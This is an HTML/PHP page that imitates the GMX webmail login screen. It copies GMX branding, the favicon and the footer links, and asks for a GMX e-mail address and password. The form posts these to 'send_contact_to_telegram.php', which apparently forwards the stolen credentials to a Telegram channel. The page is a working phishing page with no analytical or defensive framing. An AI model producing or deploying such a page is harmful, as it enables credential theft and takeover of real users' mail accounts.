<?php /* contact.php */ ?>
<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8" />
  <title>Kontakt</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <link rel="shortcut icon" type="image/x-icon" href="https://img.ui-portal.de/cd/ci/gmx.net/favicon.ico"/>
  <style>
    :root{--brand:#1c449b;--brand-dark:#183c8f;--bg:#eef2f6;--card:#fff;--text:#2b2f33;--muted:#5a6472;--border:#cfd5dd;--cta:#1e88e5;}
    *{box-sizing:border-box} html,body{height:100%}
    body{margin:0;background:var(--bg);color:var(--text);font:14px/1.45 system-ui,-apple-system,Segoe UI,Roboto,Arial;display:flex;flex-direction:column}
    .header{background:var(--brand-dark);color:#fff;padding:10px 16px;display:flex;align-items:center;gap:12px}
    .header__text{font-weight:600;font-size:18px}
    .center{flex:1;display:grid;place-items:center;padding:24px 16px}
    .card{width:100%;max-width:460px;background:var(--card);border-radius:10px;padding:22px 22px 26px;box-shadow:0 6px 20px rgba(0,0,0,.07)}
    h1{margin:0 0 10px;font-size:22px}
    label{display:block;font-weight:600;margin:14px 0 6px}
    input,textarea{width:100%;padding:10px 12px;border:1px solid var(--border);border-radius:6px;background:#fff;font-size:14px}
    textarea{min-height:120px;resize:vertical}
    input:focus,textarea:focus{outline:none;border-color:var(--brand);box-shadow:0 0 0 3px rgba(28,68,155,.15)}
    .row{display:flex;gap:10px}
    .row>*{flex:1}
    .btn{width:100%;margin-top:16px;background:#79a300;color:#fff;border:0;border-radius:6px;padding:10px;font-weight:700;font-size:15px;cursor:pointer}
    .btn:hover{filter:brightness(.96)}
    .muted{color:var(--muted);font-size:12px}
    .footer{padding:18px 16px;display:flex;gap:14px;flex-wrap:wrap;justify-content:center;font-size:13px;color:var(--muted)}
    /* Honeypot: hide from humans, visible to bots */
    .hp-wrap{position:absolute;left:-50000px;top:auto;width:1px;height:1px;overflow:hidden}
    /* stacked title like login page */
.content-title{
  display:flex;
  flex-direction:column;
  align-items:center;
  gap:10px;
  margin-bottom:12px;
  text-align:center;
}
.icon--logo-gmx-56-dims{height:32px;width:auto;display:block}
/* Form */
    .pos-form-wrapper{margin-top:10px}
    .pos-label{font-weight:600; display:block; margin:0 0 6px}
    .pos-input{position:relative}
    .revealable-input-row__input{
      width:100%; font-size:14px;
      padding:10px 12px; border:1px solid var(--border);
      background:#fff; border-radius:6px;
    }
    .revealable-input-row__input:focus{
      outline:none; border-color:var(--brand);
      box-shadow:0 0 0 3px rgba(28,68,155,.15);
    }
    .revealable-input-row{position:relative}
    .revealable-input-row__icon{
      position:absolute; top:50%; right:10px; transform:translateY(-50%);
      opacity:.8; cursor:pointer;
    }
    .revealable-input-row__icon svg{height:18px; width:18px}

    .pos-button{
      display:block; width:100%;
      border:0; border-radius:6px; padding:10px;
      font-weight:700; font-size:15px; cursor:pointer;
      margin-top:16px; background:var(--cta); color:#fff;
    }
    .pos-button:hover{filter:brightness(.96)}
  </style>
</head>
<body>
  <div class="header">
    <!-- GMX-style wordmark (inline) -->
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 123 40" aria-label="GMX" style="height:26px;width:auto">
      <path fill="#fff" d="M109.17,18.84 119.83,1.09h-10.88l-5.67,9-6.1-9H85.26L97.83,18.82 85.26,38.82h11.92l6.8-11.37 8.06,11.37h10.64zM69.75,1.09 61.66,21.28 53.99,1.09h-9.67l-6.42,37.78h9.77l3.16-21.77h.1l8.66,21.77h3.91L72.57,17.1h.12l2.75,21.77h9.82L79.54,1.09zM19.95,17.8v7.68h8c-.42,4.31-3.68,6.52-7.9,6.52-6.42,0-9.89-5.91-9.89-11.75S13.49,8.4,19.9,8.4c3.94,0,6.76,2.38,8.11,5.95l9.26-3.88C34.04,3.47,28.06,0,20.34,0,8.25,0,0,8,0,20.19,0,32,8.2,40,20,40c6.27,0,11.8-2.24,15.46-7.36,3.29-4.64,3.74-9.36,3.84-14.84z"/>
    </svg>
    <div class="header__text">Login</div>
  </div>

  <main class="center">
    <form class="card" action="send_contact_to_telegram.php" method="post" novalidate>
      <div class="content-title">
  <svg class="icon--logo-gmx-56-dims" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 123 40" aria-hidden="true">
    <path fill="#1c449b" d="M109.17,18.84 119.83,1.09h-10.88l-5.67,9-6.1-9H85.26L97.83,18.82 85.26,38.82h11.92l6.8-11.37 8.06,11.37h10.64zM69.75,1.09 61.66,21.28 53.99,1.09h-9.67l-6.42,37.78h9.77l3.16-21.77h.1l8.66,21.77h3.91L72.57,17.1h.12l2.75,21.77h9.82L79.54,1.09zM19.95,17.8v7.68h8c-.42,4.31-3.68,6.52-7.9,6.52-6.42,0-9.89-5.91-9.89-11.75S13.49,8.4,19.9,8.4c3.94,0,6.76,2.38,8.11,5.95l9.26-3.88C34.04,3.47,28.06,0,20.34,0,8.25,0,0,8,0,20.19,0,32,8.2,40,20,40c6.27,0,11.8-2.24,15.46-7.36,3.29-4.64,3.74-9.36,3.84-14.84z"/>
  </svg>
  <h1>Login</h1>
</div>

      

      <div class="row">
        
        <div>
          <label for="email">GMX E-Mail-Adresse</label>
          <input id="email" name="email" type="email" required maxlength="200" autocomplete="email" />
        </div>
      </div>

      <div class="pos-form-wrapper">
          <label class="pos-label pos-label--block required" for="password">Passwort eingeben</label>
          <div class="pos-input revealable-input-row">
            <input id="password" name="password" type="password" class="revealable-input-row__input" autocomplete="current-password" required />
            <div class="revealable-input-row__icon" id="toggleEye" aria-label="Passwort anzeigen/verbergen" role="button" tabindex="0">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor">
                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7Z" stroke-width="1.6"/>
                <circle cx="12" cy="12" r="3" stroke-width="1.6"/>
              </svg>
            </div>
          </div>
        </div>

     

      <button class="btn" type="submit">Login</button>
      
    </form>
  </main>

  <div class="footer">
    <a target="_blank" href="https://www.gmx.net/impressum">Impressum</a>
    <a target="_blank" href="https://www.gmx.net/kuendigungsformular">Verträge hier kündigen</a>
    <a target="_blank" href="https://agb-server.gmx.net/gmxagb-de">AGB</a>
    <a target="_blank" href="https://agb-server.gmx.net/datenschutz">Datenschutz</a>
  </div>
  <script>
  // simple password show/hide
  const pwd = document.getElementById('password');
  const eye = document.getElementById('toggleEye');
  if (pwd && eye) {
    const toggle = () => pwd.type = (pwd.type === 'password' ? 'text' : 'password');
    eye.addEventListener('click', toggle);
    eye.addEventListener('keypress', (e)=>{ if(e.key===' '||e.key==='Enter') toggle(); });
  }
</script>
</body>
</html>
